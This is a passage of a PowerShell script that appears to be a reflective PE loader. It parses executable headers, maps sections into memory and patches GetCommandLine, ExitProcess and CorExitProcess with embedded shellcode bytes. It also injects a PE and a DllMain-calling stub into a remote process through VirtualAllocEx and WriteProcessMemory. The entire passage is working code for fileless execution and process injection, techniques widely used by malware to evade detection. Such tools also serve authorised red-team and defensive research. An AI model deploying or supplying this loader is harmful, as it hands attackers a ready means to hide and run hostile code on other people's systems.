                $Win32Types
            )
        
            for ( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++) {
                [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
                $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
                [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
                [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
                [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
                [UInt32]$OldProtectFlag = 0
                Test-MemoryRangeValid -DebugString 'Update-MemoryProtectionFlags::VirtualProtect' -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
                $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
                if ($Success -eq $false) {
                    Throw 'Unable to change memory protection'
                }
            }
        }
    
        #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
        #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
        Function Update-ExeFunctions {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $PEInfo,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Functions,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Constants,
        
                [Parameter(Position = 3, Mandatory = $true)]
                [String]
                $ExeArguments,
        
                [Parameter(Position = 4, Mandatory = $true)]
                [IntPtr]
                $ExeDoneBytePtr
            )
        
            #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
            $ReturnArray = @() 
        
            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
            [UInt32]$OldProtectFlag = 0
        
            [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke('Kernel32.dll')
            if ($Kernel32Handle -eq [IntPtr]::Zero) {
                throw 'Kernel32 handle null'
            }
        
            [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke('KernelBase.dll')
            if ($KernelBaseHandle -eq [IntPtr]::Zero) {
                throw 'KernelBase handle null'
            }

            #################################################
            #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
            #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
            $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
            $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
            [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, 'GetCommandLineA')
            [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, 'GetCommandLineW')

            if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero) {
                throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
            }

            #Prepare the shellcode
            [Byte[]]$Shellcode1 = @()
            if ($PtrSize -eq 8) {
                $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
            }
            $Shellcode1 += 0xb8
        
            [Byte[]]$Shellcode2 = @(0xc3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
            #Make copy of GetCommandLineA and GetCommandLineW
            $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
            $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += , ($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
            $ReturnArray += , ($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

            #Overwrite GetCommandLineA
            [UInt32]$OldProtectFlag = 0
            $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
            if ($Success = $false) {
                throw 'Call to VirtualProtect failed'
            }
        
            $GetCommandLineAAddrTemp = $GetCommandLineAAddr
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
            $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
            $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
            $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
            #Overwrite GetCommandLineW
            [UInt32]$OldProtectFlag = 0
            $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
            if ($Success = $false) {
                throw 'Call to VirtualProtect failed'
            }
        
            $GetCommandLineWAddrTemp = $GetCommandLineWAddr
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
            $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
            $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
            $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
            #################################################
        
        
            #################################################
            #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
            #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
            #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
            #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
            $DllList = @('msvcr70d.dll', 'msvcr71d.dll', 'msvcr80d.dll', 'msvcr90d.dll', 'msvcr100d.dll', 'msvcr110d.dll', 'msvcr70.dll' `
                    , 'msvcr71.dll', 'msvcr80.dll', 'msvcr90.dll', 'msvcr100.dll', 'msvcr110.dll')
        
            foreach ($Dll in $DllList) {
                [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
                if ($DllHandle -ne [IntPtr]::Zero) {
                    [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, '_wcmdln')
                    [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, '_acmdln')
                    if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero) {
                        "Error, couldn't find _wcmdln or _acmdln"
                    }
                
                    $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                    $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                    #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                    $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                    $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                    $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                    $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                    $ReturnArray += , ($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                    $ReturnArray += , ($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                    $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                    if ($Success = $false) {
                        throw 'Call to VirtualProtect failed'
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                    $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                    $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                    if ($Success = $false) {
                        throw 'Call to VirtualProtect failed'
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                    $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                }
            }
            #################################################
        
        
            #################################################
            #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

            $ReturnArray = @()
            $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
            #CorExitProcess (compiled in to visual studio c++)
            [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke('mscoree.dll')
            if ($MscoreeHandle -eq [IntPtr]::Zero) {
                throw 'mscoree handle null'
            }
            [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, 'CorExitProcess')
            if ($CorExitProcessAddr -eq [IntPtr]::Zero) {
                Throw 'CorExitProcess address not found'
            }
            $ExitFunctions += $CorExitProcessAddr
        
            #ExitProcess (what non-managed programs use)
            [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, 'ExitProcess')
            if ($ExitProcessAddr -eq [IntPtr]::Zero) {
                Throw 'ExitProcess address not found'
            }
            $ExitFunctions += $ExitProcessAddr
        
            [UInt32]$OldProtectFlag = 0
            foreach ($ProcExitFunctionAddr in $ExitFunctions) {
                $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
                #The following is the shellcode (Shellcode: ExitThread.asm):
                #32bit shellcode
                [Byte[]]$Shellcode1 = @(0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
                #64bit shellcode (Shellcode: ExitThread.asm)
                if ($PtrSize -eq 8) {
                    [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                    [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
                }
                [Byte[]]$Shellcode3 = @(0xff, 0xd3)
                $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
                [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, 'ExitThread')
                if ($ExitThreadAddr -eq [IntPtr]::Zero) {
                    Throw 'ExitThread address not found'
                }

                $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
                if ($Success -eq $false) {
                    Throw 'Call to VirtualProtect failed'
                }
            
                #Make copy of original ExitProcess bytes
                $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
                $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
                $ReturnArray += , ($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
                #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
                #   call ExitThread
                Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
                Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
                $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
                Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

                $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
            }
            #################################################

            Write-Output $ReturnArray
        }
    
    
        #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
        #   It copies Count bytes from Source to Destination.
        Function Copy-ArrayOfMemAddresses {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Array[]]
                $CopyInfo,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $Win32Functions,
        
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $Win32Constants
            )

            [UInt32]$OldProtectFlag = 0
            foreach ($Info in $CopyInfo) {
                $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
                if ($Success -eq $false) {
                    Throw 'Call to VirtualProtect failed'
                }
            
                $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
                $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
            }
        }


        #####################################
        ##########    FUNCTIONS   ###########
        #####################################
        Function Get-MemoryProcAddress {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $PEHandle,
        
                [Parameter(Position = 1, Mandatory = $true)]
                [String]
                $FunctionName
            )
        
            $Win32Types = Get-Win32Types
            $Win32Constants = Get-Win32Constants
            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
            #Get the export table
            if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0) {
                return [IntPtr]::Zero
            }
            $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
            $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
            for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++) {
                #AddressOfNames is an array of pointers to strings of the names of the functions exported
                $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
                $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

                if ($Name -ceq $FunctionName) {
                    #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                    #    which contains the offset of the function in to the DLL
                    $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                    $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                    $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                    $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                    return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
                }
            }
        
            return [IntPtr]::Zero
        }


        Function Invoke-MemoryLoadLibrary {
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $PEBytes,
        
                [Parameter(Position = 1, Mandatory = $false)]
                [String]
                $ExeArgs,
        
                [Parameter(Position = 2, Mandatory = $false)]
                [IntPtr]
                $RemoteProcHandle
            )
        
            $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
            #Get Win32 constants and functions
            $Win32Constants = Get-Win32Constants
            $Win32Functions = Get-Win32Functions
            $Win32Types = Get-Win32Types
        
            $RemoteLoading = $false
            if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero)) {
                $RemoteLoading = $true
            }
        
            #Get basic PE information
            Write-Verbose 'Getting basic PE information from the file'
            $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
            $OriginalImageBase = $PEInfo.OriginalImageBase
            $NXCompatible = $true
            if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) {
                Write-Warning 'PE is not compatible with DEP, might cause issues' -WarningAction Continue
                $NXCompatible = $false
            }
        
        
            #Verify that the PE and the current process are the same bits (32bit or 64bit)
            $Process64Bit = $true
            if ($RemoteLoading -eq $true) {
                $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke('kernel32.dll')
                $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, 'IsWow64Process')
                if ($Result -eq [IntPtr]::Zero) {
                    Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
                }
            
                [Bool]$Wow64Process = $false
                $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
                if ($Success -eq $false) {
                    Throw 'Call to IsWow64Process failed'
                }
            
                if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4))) {
                    $Process64Bit = $false
                }
            
                #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
                $PowerShell64Bit = $true
                if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
                    $PowerShell64Bit = $false
                }
                if ($PowerShell64Bit -ne $Process64Bit) {
                    throw 'PowerShell must be same architecture (x86/x64) as PE being loaded and remote process'
                }
            }
            else {
                if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8) {
                    $Process64Bit = $false
                }
            }
            if ($Process64Bit -ne $PEInfo.PE64Bit) {
                Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
            }
        

            #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
            Write-Verbose 'Allocating memory for the PE and write its headers to memory'
        
            [IntPtr]$LoadAddr = [IntPtr]::Zero
            if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) {
                Write-Warning 'PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again' -WarningAction Continue
                [IntPtr]$LoadAddr = $OriginalImageBase
            }

            $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
            $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
            if ($RemoteLoading -eq $true) {
                #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            
                #todo, error handling needs to delete this memory if an error happens along the way
                $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($EffectivePEHandle -eq [IntPtr]::Zero) {
                    Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
                }
            }
            else {
                if ($NXCompatible -eq $true) {
                    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
                }
                else {
                    $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                }
                $EffectivePEHandle = $PEHandle
            }
        
            [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
            if ($PEHandle -eq [IntPtr]::Zero) { 
                Throw 'VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free).'
            }       
            [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
        
        
            #Now that the PE is in memory, get more detailed information about it
            Write-Verbose 'Getting detailed PE information from the headers loaded in memory'
            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
            $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
            $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
            Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
        
        
            #Copy each section from the PE in to memory
            Write-Verbose 'Copy PE sections in to memory'
            Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
        
        
            #Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
            Write-Verbose 'Update memory addresses based on where the PE was actually loaded in memory'
            Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

        
            #The PE we are in-memory loading has DLLs it needs, import those DLLs for it
            Write-Verbose "Import DLL's needed by the PE we are loading"
            if ($RemoteLoading -eq $true) {
                Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
            }
            else {
                Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
            }
        
        
            #Update the memory protection flags for all the memory just allocated
            if ($RemoteLoading -eq $false) {
                if ($NXCompatible -eq $true) {
                    Write-Verbose 'Update memory protection flags'
                    Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
                }
                else {
                    Write-Verbose 'PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute'
                }
            }
            else {
                Write-Verbose 'PE being loaded in to a remote process, not adjusting memory permissions'
            }
        
        
            #If remote loading, copy the DLL in to remote process memory
            if ($RemoteLoading -eq $true) {
                [UInt32]$NumBytesWritten = 0
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
                if ($Success -eq $false) {
                    Throw 'Unable to write shellcode to remote process memory.'
                }
            }
        
        
            #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
            if ($PEInfo.FileType -ieq 'DLL') {
                if ($RemoteLoading -eq $false) {
                    Write-Verbose 'Calling dllmain so the DLL knows it has been loaded'
                    $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                    $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                    $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                    $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
                }
                else {
                    $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                    if ($PEInfo.PE64Bit -eq $true) {
                        #Shellcode: CallDllMain.asm
                        $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                        $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                        $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                    }
                    else {
                        #Shellcode: CallDllMain.asm
                        $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                        $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                        $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                    }
                    $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                    $SCPSMemOriginal = $SCPSMem
                
                    Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                    Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                    Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                    if ($RSCAddr -eq [IntPtr]::Zero) {
                        Throw 'Unable to allocate memory in the remote process for shellcode'
                    }
                
                    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength)) {
                        Throw 'Unable to write shellcode to remote process memory.'
                    }

